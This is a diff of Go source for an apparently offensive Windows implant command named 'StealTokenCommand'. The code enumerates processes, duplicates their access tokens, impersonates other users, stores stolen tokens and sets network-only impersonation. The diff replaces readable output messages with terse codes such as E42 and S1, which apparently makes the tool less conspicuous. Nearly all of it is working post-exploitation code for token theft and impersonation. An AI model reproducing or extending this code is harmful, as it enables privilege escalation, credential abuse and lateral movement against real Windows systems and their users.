@@ -50,14 +50,13 @@ type StealTokenCommand struct{}
 
 func (c *StealTokenCommand) listTokens() CommandResult {
 	var output strings.Builder
-	output.WriteString("=== Accessible Process Tokens ===\n\n")
 	output.WriteString(fmt.Sprintf("%-8s %-30s %-25s %s\n", "PID", "Process Name", "User", "Status"))
 	output.WriteString(strings.Repeat("-", 90) + "\n")
 
 	processes, err := getProcessList()
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Error enumerating processes: %v", err),
+			Output:      Err(E43),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -122,13 +121,11 @@ func (c *StealTokenCommand) listTokens() CommandResult {
 }
 
 func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
-	var output strings.Builder
-
 	// Open the target process
 	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to open process %d: %v", pid, err),
+			Output:      ErrCtx(E43, fmt.Sprintf("%d", pid)),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -140,7 +137,7 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to open process token: %v", err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -172,11 +169,6 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	// Get original user info before impersonation
 	originalUser, originalDomain := c.getCurrentUserInfo()
 
-	output.WriteString("=== Stealing Token ===\n")
-	output.WriteString(fmt.Sprintf("Original token: %s\\%s\n", originalDomain, originalUser))
-	output.WriteString(fmt.Sprintf("Target token: %s\\%s (PID: %d, Process: %s)\n\n",
-		targetDomain, targetUser, pid, processName))
-
 	// Duplicate token for impersonation with ALL access rights
 	var impersonationToken syscall.Handle
 	err = DuplicateTokenEx(
@@ -189,7 +181,7 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to duplicate token: %v", err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -232,13 +224,8 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 		globalTokenStore.NetOnlyHandle = impersonationToken
 		globalTokenStore.mu.Unlock()
 
-		output.WriteString("[+] Token stolen for network-only use!\n")
-		output.WriteString(fmt.Sprintf("    Network operations will use: %s\\%s\n", targetDomain, targetUser))
-		output.WriteString(fmt.Sprintf("    Local operations will remain: %s\\%s\n", originalDomain, originalUser))
-		output.WriteString(fmt.Sprintf("    Token stored as: %s\n", name))
-
 		return CommandResult{
-			Output:      output.String(),
+			Output:      SuccCtx(S1, name),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -255,7 +242,7 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 		CloseHandle(impersonationToken)
 
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to impersonate token: %v", err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -267,36 +254,19 @@ func (c *StealTokenCommand) stealAndImpersonate(ctx *CommandContext, pid int, na
 	globalTokenStore.ActiveToken = name
 	globalTokenStore.mu.Unlock()
 
-	// Verify impersonation by checking thread token
-	var threadToken syscall.Token
-	err = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
-	if err != nil {
-		output.WriteString("[!] Warning: Could not verify thread impersonation\n")
-		newUser, newDomain := c.getCurrentUserInfo()
-		output.WriteString(fmt.Sprintf("    Process still shows: %s\\%s\n", newDomain, newUser))
-	} else {
-		defer threadToken.Close()
-		threadUser, threadDomain := c.getTokenUserInfo(syscall.Handle(threadToken))
-		output.WriteString("[+] Token stolen successfully!\n")
-		output.WriteString(fmt.Sprintf("    Thread now running as: %s\\%s\n", threadDomain, threadUser))
-		output.WriteString(fmt.Sprintf("    Token stored as: %s\n", name))
-	}
-
 	return CommandResult{
-		Output:      output.String(),
+		Output:      SuccCtx(S4, name),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
 }
 
 func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string, netOnly bool) CommandResult {
-	var output strings.Builder
-
 	// Open the target process
 	handle, err := OpenProcess(PROCESS_QUERY_INFORMATION, false, uint32(pid))
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to open process %d: %v", pid, err),
+			Output:      ErrCtx(E43, fmt.Sprintf("%d", pid)),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -308,7 +278,7 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 	err = OpenProcessToken(handle, TOKEN_QUERY|TOKEN_DUPLICATE, &processToken)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to open process token: %v", err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -340,7 +310,7 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 	)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to duplicate token: %v", err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -375,19 +345,8 @@ func (c *StealTokenCommand) storeToken(ctx *CommandContext, pid int, name string
 
 	globalTokenStore.mu.Unlock()
 
-	output.WriteString(fmt.Sprintf("[+] Token stored successfully!\n"))
-	output.WriteString(fmt.Sprintf("    Name: %s\n", name))
-	output.WriteString(fmt.Sprintf("    User: %s\\%s\n", targetDomain, targetUser))
-	output.WriteString(fmt.Sprintf("    Source: %s (PID: %d)\n", processName, pid))
-
-	if netOnly {
-		output.WriteString("    Mode: Network-Only\n")
-	} else {
-		output.WriteString("    Mode: Full Impersonation\n")
-	}
-
 	return CommandResult{
-		Output:      output.String(),
+		Output:      SuccCtx(S1, name),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -400,7 +359,7 @@ func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, net
 
 	if !exists {
 		return CommandResult{
-			Output:      fmt.Sprintf("Token '%s' not found in store", name),
+			Output:      ErrCtx(E47, name),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -411,11 +370,6 @@ func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, net
 		return c.setNetOnlyToken(ctx, name)
 	}
 
-	var output strings.Builder
-
-	// Get current user before switching
-	currentUser, currentDomain := c.getCurrentUserInfo()
-
 	// Revert any current impersonation first
 	RevertToSelf()
 
@@ -423,7 +377,7 @@ func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, net
 	err := ImpersonateLoggedOnUser(token)
 	if err != nil {
 		return CommandResult{
-			Output:      fmt.Sprintf("Failed to impersonate token '%s': %v", name, err),
+			Output:      Err(E42),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -435,22 +389,8 @@ func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, net
 	globalTokenStore.ActiveToken = name
 	globalTokenStore.mu.Unlock()
 
-	// Verify impersonation
-	var threadToken syscall.Token
-	err = OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, &threadToken)
-	if err != nil {
-		output.WriteString("[!] Warning: Could not verify thread impersonation\n")
-	} else {
-		defer threadToken.Close()
-		actualUser, actualDomain := c.getTokenUserInfo(syscall.Handle(threadToken))
-		output.WriteString("[+] Token switched successfully!\n")
-		output.WriteString(fmt.Sprintf("    Previous: %s\\%s\n", currentDomain, currentUser))
-		output.WriteString(fmt.Sprintf("    Current: %s\\%s\n", actualDomain, actualUser))
-		output.WriteString(fmt.Sprintf("    Token: %s\n", name))
-	}
-
 	return CommandResult{
-		Output:      output.String(),
+		Output:      SuccCtx(S4, name),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -458,14 +398,13 @@ func (c *StealTokenCommand) useStoredToken(ctx *CommandContext, name string, net
 
 func (c *StealTokenCommand) listStoredTokens() CommandResult {
 	var output strings.Builder
-	output.WriteString("=== Stored Tokens ===\n\n")
 
 	globalTokenStore.mu.RLock()
 	defer globalTokenStore.mu.RUnlock()
 
 	if len(globalTokenStore.Tokens) == 0 {
 		return CommandResult{
-			Output:      "No tokens stored",
+			Output:      Succ(S0),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -536,7 +475,7 @@ func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) 
 	token, exists := globalTokenStore.Tokens[name]
 	if !exists {
 		return CommandResult{
-			Output:      fmt.Sprintf("Token '%s' not found in store", name),
+			Output:      ErrCtx(E47, name),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -545,7 +484,7 @@ func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) 
 	// Don't allow removing the active token
 	if globalTokenStore.IsImpersonating && globalTokenStore.ActiveToken == name {
 		return CommandResult{
-			Output:      fmt.Sprintf("Cannot remove active token '%s'. Use 'token revert' first", name),
+			Output:      ErrCtx(E48, name),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -554,7 +493,7 @@ func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) 
 	// Don't allow removing the active network-only token
 	if globalTokenStore.NetOnlyToken == name {
 		return CommandResult{
-			Output:      fmt.Sprintf("Cannot remove active network-only token '%s'. Use 'token netonly clear' first", name),
+			Output:      ErrCtx(E48, name),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -568,7 +507,7 @@ func (c *StealTokenCommand) removeStoredToken(ctx *CommandContext, name string) 
 	delete(globalTokenStore.Metadata, name)
 
 	return CommandResult{
-		Output:      fmt.Sprintf("[+] Token '%s' removed successfully", name),
+		Output:      SuccCtx(S2, name),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -626,7 +565,7 @@ func (c *StealTokenCommand) setNetOnlyToken(ctx *CommandContext, name string) Co
 	token, exists := globalTokenStore.Tokens[name]
 	if !exists {
 		return CommandResult{
-			Output:      fmt.Sprintf("Token '%s' not found in store", name),
+			Output:      ErrCtx(E47, name),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
@@ -635,34 +574,13 @@ func (c *StealTokenCommand) setNetOnlyToken(ctx *CommandContext, name string) Co
 	metadata := globalTokenStore.Metadata[name]
 
 	// Set as network-only token WITHOUT immediately impersonating
-	// The impersonation will happen on-demand when network operations are performed
 	globalTokenStore.NetOnlyToken = name
 	globalTokenStore.NetOnlyHandle = token
 	metadata.NetOnly = true
 	globalTokenStore.Metadata[name] = metadata
 
-	// DON'T call ImpersonateLoggedOnUser here!
-	// This was the bug - it was applying impersonation to the main thread
-	// which would then persist across operations
-
-	// REMOVED THIS PROBLEMATIC CODE:
-	// err := ImpersonateLoggedOnUser(token)
-	// if err != nil {
-	//     return CommandResult{
-	//         Output:      fmt.Sprintf("Failed to activate network-only token: %v", err),
-	//         ExitCode:    1,
-	//         CompletedAt: time.Now().Format(time.RFC3339),
-	//     }
-	// }
-
-	var output strings.Builder
-	output.WriteString("[+] Network-only token set!\n")
-	output.WriteString(fmt.Sprintf("    Token: %s\n", name))
-	output.WriteString(fmt.Sprintf("    User: %s\\%s\n", metadata.Domain, metadata.User))
-	output.WriteString("    Note: Token will be applied only for network operations\n")
-
 	return CommandResult{
-		Output:      output.String(),
+		Output:      SuccCtx(S1, name),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
@@ -674,18 +592,11 @@ func (c *StealTokenCommand) clearNetOnlyToken(ctx *CommandContext) CommandResult
 
 	if globalTokenStore.NetOnlyToken == "" {
 		return CommandResult{
-			Output:      "No network-only token is currently set",
+			Output:      Succ(S0),
 			ExitCode:    0,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}
 	}
-
-	// DON'T call RevertToSelf here - we're just clearing the reference
-	// The actual impersonation cleanup happens when operations complete
-	// or when rev2self is called
-
-	// REMOVED THIS LINE:
-	// RevertToSelf()
 
 	// Update metadata to clear netonly flag
 	if metadata, exists := globalTokenStore.Metadata[globalTokenStore.NetOnlyToken]; exists {
@@ -698,7 +609,7 @@ func (c *StealTokenCommand) clearNetOnlyToken(ctx *CommandContext) CommandResult
 	globalTokenStore.NetOnlyHandle = 0
 
 	return CommandResult{
-		Output:      fmt.Sprintf("[+] Cleared network-only token '%s'", previousToken),
+		Output:      SuccCtx(S2, previousToken),
 		ExitCode:    0,
 		CompletedAt: time.Now().Format(time.RFC3339),
 	}
